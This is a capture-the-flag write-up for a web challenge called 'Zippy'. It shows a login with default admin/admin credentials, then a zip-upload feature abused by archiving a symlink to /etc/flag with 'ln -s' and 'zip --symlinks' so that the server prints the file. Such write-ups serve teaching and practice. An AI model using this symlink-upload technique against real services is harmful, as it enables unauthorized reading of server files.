# Zippy

> web

Author: [whitex](https://github.com/najeh-halawani)

Can You Break The Upload Zip Function, And Get The Flag?

## Writeup
## Recon

Checking source code, you'll get that the login creds are the same of admin.gif file, so login with ```admin/admin```

![login page](https://github.com/najeh-halawani/CyberhackCTF-Writeups/blob/master/Zippy/source%20code.png)

You'll be redirected to an upload zip file section....after understanding how the challenge work, u should know how to solve it.

![upload section](https://github.com/najeh-halawani/CyberhackCTF-Writeups/blob/master/Zippy/upload.png)

Okay, so the flag is in /etc/flag.. the challenge will unzip the zip file and cat * inside the upload dir... so let's make a symlink with flag path then make an archive of it :D 

```
ln -s /etc/flag flag

zip --symlinks flag.zip flag 

upload zip file ==> Got The Flag

```

```
Zip contents: cyberhack{#symlink_is_za_best}
```

![Getting the flag](https://github.com/najeh-halawani/CyberhackCTF-Writeups/blob/master/Zippy/flag.png)
